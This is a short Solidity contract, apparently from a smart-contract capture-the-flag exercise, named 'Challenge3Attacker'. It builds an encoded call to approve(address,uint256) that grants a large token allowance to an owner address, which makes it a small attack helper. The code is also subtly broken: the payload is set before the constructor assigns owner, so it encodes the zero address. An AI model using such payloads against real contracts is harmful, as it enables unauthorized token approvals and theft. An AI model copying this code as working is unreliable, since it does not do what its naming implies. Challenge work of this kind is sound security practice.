pragma solidity ^0.8.0;

contract Challenge3Attacker {

    address owner;
    bytes payload = abi.encodeWithSignature("approve(address,uint256)", owner, 1000000);

    constructor (address _owner) public {
        owner = _owner;
    }

    function getPayload() public view returns (bytes memory) {
      return payload;
    }
}
